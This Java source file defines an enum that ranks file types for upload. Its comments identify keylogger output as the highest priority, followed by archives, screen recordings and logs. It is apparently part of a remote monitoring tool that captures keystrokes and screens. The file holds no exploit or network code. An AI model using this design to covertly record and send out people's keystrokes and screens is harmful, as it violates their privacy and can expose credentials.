package com.rmac.utils;

/**
 * Type of file to upload or archive and their upload priorities.
 * <br>
 * <br>
 * <code>KEY</code> : Signifies a key-log output file, this type of file has the highest priority
 * for uploads.
 * <br>
 * <code>ARCHIVE</code> : Signifies an archive (zip of similar type of files that couldn't be
 * uploaded directly due to disabled configs or network disconnection).
 * <br>
 * <code>SCREEN</code> : Signifies a screen recording file.
 * <br>
 * <code>OTHER</code> : Other types of files such as logs, this type of file has the lowest priority
 * for uploads.
 */
public enum ArchiveFileType {
  KEY(4),
  ARCHIVE(3),
  SCREEN(2),
  OTHER(1);

  private final int priority;

  ArchiveFileType(int priority) {
    this.priority = priority;
  }

  public int getPriority() {
    return priority;
  }
}
